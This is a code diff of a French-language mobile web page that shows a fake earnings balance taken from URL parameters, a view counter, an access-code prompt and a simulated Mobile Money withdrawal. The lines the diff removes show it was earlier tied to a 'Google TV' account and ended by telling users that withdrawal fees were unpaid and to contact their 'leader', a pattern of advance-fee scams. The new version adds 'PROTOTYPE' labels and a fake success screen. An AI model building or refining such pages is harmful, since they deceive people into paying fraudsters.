@@ -23,7 +23,48 @@ body{
 }
 
 /* =========================
-   ÉCRAN MESSAGE
+   NOTIFICATION PROTOTYPE
+========================= */
+
+.prototype-notification{
+    position:fixed;
+    top:10px;
+    left:50%;
+    transform:translate(-50%,-150%);
+    width:calc(100% - 20px);
+    max-width:370px;
+    background:#fff;
+    color:#10213d;
+    border-radius:16px;
+    padding:14px 16px;
+    box-shadow:0 6px 25px rgba(0,0,0,.35);
+    z-index:20000;
+    transition:transform .3s ease;
+}
+
+.prototype-notification.show{
+    transform:translate(-50%,0);
+}
+
+.notification-label{
+    color:#1764ca;
+    font-size:10px;
+    font-weight:bold;
+    letter-spacing:.6px;
+    margin-bottom:7px;
+}
+
+.notification-text{
+    font-size:13px;
+    line-height:1.5;
+}
+
+.notification-text strong{
+    font-size:15px;
+}
+
+/* =========================
+   ÉCRAN INITIAL
 ========================= */
 
 .access-message{
@@ -37,7 +78,8 @@ body{
     z-index:9999;
 }
 
-.message-box{
+.message-box,
+.code-box{
     width:100%;
     max-width:360px;
     background:#fff;
@@ -56,21 +98,24 @@ body{
     margin-bottom:14px;
 }
 
-.message-title{
+.message-title,
+.code-title{
     color:#1764ca;
     font-size:20px;
     font-weight:bold;
     margin-bottom:13px;
 }
 
-.message-text{
+.message-text,
+.code-text{
     color:#4d5d73;
     font-size:14px;
     line-height:1.5;
     margin-bottom:22px;
 }
 
-.continue-btn{
+.continue-btn,
+.code-btn{
     width:100%;
     height:48px;
     border:0;
@@ -83,7 +128,7 @@ body{
 }
 
 /* =========================
-   CODE D'ACCÈS
+   CODE
 ========================= */
 
 .code-screen{
@@ -101,31 +146,6 @@ body{
     display:flex;
 }
 
-.code-box{
-    width:100%;
-    max-width:360px;
-    background:#fff;
-    color:#10213d;
-    border-radius:24px;
-    padding:27px 20px;
-    text-align:center;
-    box-shadow:0 8px 30px rgba(0,0,0,.25);
-}
-
-.code-title{
-    color:#1764ca;
-    font-size:20px;
-    font-weight:bold;
-    margin-bottom:10px;
-}
-
-.code-text{
-    color:#4d5d73;
-    font-size:13px;
-    line-height:1.5;
-    margin-bottom:18px;
-}
-
 .code-input{
     width:100%;
     height:48px;
@@ -139,22 +159,6 @@ body{
     margin-bottom:12px;
 }
 
-.code-input:focus{
-    border-color:#1764ca;
-}
-
-.code-btn{
-    width:100%;
-    height:48px;
-    border:0;
-    border-radius:14px;
-    background:#1764ca;
-    color:#fff;
-    font-size:15px;
-    font-weight:bold;
-    cursor:pointer;
-}
-
 .code-error{
     display:none;
     color:#e53935;
@@ -164,7 +168,7 @@ body{
 }
 
 /* =========================
-   TABLEAU PRINCIPAL
+   TABLEAU
 ========================= */
 
 .dashboard{
@@ -200,10 +204,6 @@ body{
     font-weight:bold;
 }
 
-.eye{
-    font-size:16px;
-}
-
 .amount{
     color:#10213d;
     font-size:30px;
@@ -215,7 +215,6 @@ body{
 .bonus-gain{
     display:flex;
     gap:9px;
-    width:100%;
 }
 
 .bonus-box,
@@ -232,11 +231,6 @@ body{
     gap:9px;
     font-size:17px;
     font-weight:bold;
-    cursor:pointer;
-}
-
-.box-icon{
-    font-size:24px;
 }
 
 /* =========================
@@ -272,7 +266,7 @@ body{
 }
 
 /* =========================
-   BOUTON RETRAIT
+   RETRAIT
 ========================= */
 
 .withdraw{
@@ -289,7 +283,7 @@ body{
 }
 
 /* =========================
-   TRANSFERT EN COURS
+   TRANSFERT
 ========================= */
 
 .transfer-status{
@@ -304,14 +298,6 @@ body{
 
 .transfer-status.show{
     display:block;
-}
-
-.transfer-prototype{
-    color:#20df8a;
-    font-size:10px;
-    font-weight:bold;
-    letter-spacing:.5px;
-    margin-bottom:20px;
 }
 
 .transfer-spinner{
@@ -342,43 +328,51 @@ body{
 
 .result{
     display:none;
-    background:#102852;
-    border-radius:24px;
-    padding:30px 18px;
     text-align:center;
-    margin-bottom:15px;
-    border:1px solid #193867;
 }
 
 .result.show{
     display:block;
 }
 
-.result-icon{
-    width:52px;
-    height:52px;
+.result-prototype{
+    color:#20df8a;
+    font-size:11px;
+    font-weight:bold;
+    letter-spacing:.7px;
+    margin-bottom:14px;
+}
+
+.success-card{
+    background:#fff;
+    color:#111;
+    padding:45px 18px 38px;
+    text-align:center;
+    box-shadow:0 4px 18px rgba(0,0,0,.18);
+}
+
+.success-icon{
+    width:190px;
+    height:190px;
+    border:8px solid #22c55e;
     border-radius:50%;
-    background:#ffeded;
-    color:#e53935;
+    margin:0 auto 28px;
     display:flex;
     align-items:center;
     justify-content:center;
-    margin:0 auto 15px;
-    font-size:25px;
-    font-weight:bold;
 }
 
-.result-title{
-    color:#ff4b4b;
-    font-size:18px;
+.success-icon span{
+    color:#22c55e;
+    font-size:125px;
     font-weight:bold;
-    margin-bottom:7px;
+    line-height:1;
 }
 
-.result-text{
-    color:#d5deea;
-    font-size:13px;
-    line-height:1.5;
+.success-title{
+    color:#111;
+    font-size:27px;
+    font-weight:800;
 }
 
 /* =========================
@@ -407,7 +401,6 @@ body{
     color:#fff;
     font-size:12px;
     font-weight:bold;
-    cursor:pointer;
 }
 
 .network.selected{
@@ -465,12 +458,8 @@ body{
 }
 
 @keyframes rotation{
-    from{
-        transform:rotate(0deg);
-    }
-    to{
-        transform:rotate(360deg);
-    }
+    from{transform:rotate(0deg);}
+    to{transform:rotate(360deg);}
 }
 </style>
 </head>
@@ -478,7 +467,22 @@ body{
 <body>
 
 <!-- =========================
-     1. MESSAGE AVANT LE CODE
+     NOTIFICATION
+========================= -->
+
+<div class="prototype-notification" id="prototypeNotification">
+
+    <div class="notification-label">
+        PROTOTYPE
+    </div>
+
+    <div class="notification-text" id="notificationText"></div>
+
+</div>
+
+
+<!-- =========================
+     MESSAGE INITIAL
 ========================= -->
 
 <div class="access-message" id="messageScreen">
@@ -493,8 +497,7 @@ body{
 
         <div class="message-text">
             Vous souhaitez réellement retirer l'argent
-            de votre compte Google TV sur votre numéro
-            Mobile Money ?
+            de votre compte sur votre numéro Mobile Money ?
             <br><br>
             Veuillez confirmer pour continuer.
         </div>
@@ -509,7 +512,7 @@ body{
 
 
 <!-- =========================
-     2. DEMANDE DU CODE
+     CODE
 ========================= -->
 
 <div class="code-screen" id="codeScreen">
@@ -550,16 +553,14 @@ body{
 
 
 <!-- =========================
-     3. TABLEAU
+     TABLEAU
 ========================= -->
 
 <div class="dashboard" id="dashboard">
 
     <div class="amount-box" id="mainCard">
 
-        <div class="prototype">
-            PROTOTYPE
-        </div>
+        <div class="prototype">PROTOTYPE</div>
 
         <div class="person-name" id="personName">
             Nom de la personne
@@ -567,7 +568,7 @@ body{
 
         <div class="amount-label">
             <span>Solde disponible</span>
-            <span class="eye">👁</span>
+            <span>👁</span>
         </div>
 
         <div class="amount" id="amount">
@@ -577,13 +578,11 @@ body{
         <div class="bonus-gain">
 
             <button class="bonus-box" type="button">
-                <span class="box-icon">🎁</span>
-                <span>Bonus</span>
+                🎁 Bonus
             </button>
 
             <button class="gain-box" type="button">
-                <span class="box-icon">👛</span>
-                <span>Gain</span>
+                👛 Gain
             </button>
 
         </div>
@@ -594,23 +593,13 @@ body{
     <div class="stats" id="stats">
 
         <div class="stat">
-            <div class="stat-title">
-                Vues comptées
-            </div>
-
-            <div class="stat-value">
-                162 vues
-            </div>
+            <div class="stat-title">Vues comptées</div>
+            <div class="stat-value">162 vues</div>
         </div>
 
         <div class="stat">
-            <div class="stat-title">
-                Retrait
-            </div>
-
-            <div class="stat-value">
-                Disponible
-            </div>
+            <div class="stat-title">Retrait</div>
+            <div class="stat-value">Disponible</div>
         </div>
 
     </div>
@@ -621,13 +610,9 @@ body{
     </button>
 
 
-    <!-- TRANSFERT -->
-
     <div class="transfer-status" id="transferStatus">
 
-        <div class="transfer-prototype">
-            PROTOTYPE
-        </div>
+        <div class="prototype">PROTOTYPE</div>
 
         <div class="transfer-spinner"></div>
 
@@ -636,32 +621,29 @@ body{
         </div>
 
         <div class="transfer-text">
-            Veuillez patienter pendant le traitement
-            de votre demande.
+            Simulation du traitement...
         </div>
 
     </div>
 
 
-    <!-- ERREUR APRÈS 10 SECONDES -->
-
     <div class="result" id="result">
 
-        <div class="result-icon">
-            !
+        <div class="result-prototype">
+            PROTOTYPE
         </div>
 
-        <div class="result-title">
-            Retrait impossible
+        <div class="success-card">
+
+            <div class="success-icon">
+                <span>✓</span>
+            </div>
+
+            <div class="success-title">
+                Transfert réussi !
+            </div>
+
         </div>
-
-        <div class="result-title">
-    Frais de retrait impayés
-</div>
-
-<div class="result-text">
-    Veuillez contacter votre leader.
-</div>
 
     </div>
 
@@ -722,7 +704,7 @@ body{
 <script>
 
 /* =========================
-   NOM + MONTANT DE L'URL
+   NOM + MONTANT URL
 ========================= */
 
 const params = new URLSearchParams(window.location.search);
@@ -750,17 +732,17 @@ if(montant){
 
 
 /* =========================
-   ÉTAPE 1 → ÉTAPE 2
+   ÉCRAN INITIAL
 ========================= */
 
 const messageScreen =
     document.getElementById("messageScreen");
 
-const continueBtn =
-    document.getElementById("continueBtn");
-
 const codeScreen =
     document.getElementById("codeScreen");
+
+const continueBtn =
+    document.getElementById("continueBtn");
 
 continueBtn.addEventListener("click",function(){
 
@@ -774,7 +756,7 @@ continueBtn.addEventListener("click",function(){
 
 
 /* =========================
-   CODE D'ACCÈS DE DÉMONSTRATION
+   CODE
 ========================= */
 
 const accessCode =
@@ -825,7 +807,7 @@ accessCode.addEventListener("keydown",function(event){
 
 
 /* =========================
-   CHOIX DU RÉSEAU
+   RÉSEAU
 ========================= */
 
 const networkButtons =
@@ -839,9 +821,7 @@ networkButtons.forEach(function(button){
     button.addEventListener("click",function(){
 
         networkButtons.forEach(function(item){
-
             item.classList.remove("selected");
-
         });
 
         button.classList.add("selected");
@@ -855,7 +835,58 @@ networkButtons.forEach(function(button){
 
 
 /* =========================
-   BOUTON RETIRER
+   NOTIFICATION PROTOTYPE
+========================= */
+
+function afficherNotification(){
+
+    const montantActuel =
+        document.getElementById("amount").textContent;
+
+    const numero =
+        document.getElementById("phone").value.trim();
+
+    const maintenant = new Date();
+
+    const date =
+        maintenant.toLocaleDateString("fr-FR");
+
+    const heure =
+        maintenant.toLocaleTimeString(
+            "fr-FR",
+            {
+                hour:"2-digit",
+                minute:"2-digit"
+            }
+        );
+
+    document.getElementById("notificationText").innerHTML =
+        "Montant : <strong>" +
+        montantActuel +
+        "</strong><br>" +
+        "Numéro : " +
+        (numero || "Non renseigné") +
+        "<br>" +
+        date +
+        " à " +
+        heure;
+
+    const notification =
+        document.getElementById("prototypeNotification");
+
+    notification.classList.add("show");
+
+    setTimeout(function(){
+
+        notification.classList.remove("show");
+
+    },2000);
+
+}
+
+
+/* =========================
+   RETRAIT
 ========================= */
 
 const withdrawBtn =
@@ -882,8 +913,10 @@ const networks =
 const formBox =
     document.getElementById("formBox");
 
-
 withdrawBtn.addEventListener("click",function(){
+
+    /* Notification immédiate */
+    afficherNotification();
 
     mainCard.style.display = "none";
 
@@ -900,7 +933,7 @@ withdrawBtn.addEventListener("click",function(){
     transferStatus.classList.add("show");
 
 
-    /* Après 10 secondes */
+    /* Résultat après 10 secondes */
 
     setTimeout(function(){
 
@@ -915,4 +948,4 @@ withdrawBtn.addEventListener("click",function(){
 </script>
 
 </body>
-   </html>
+</html>
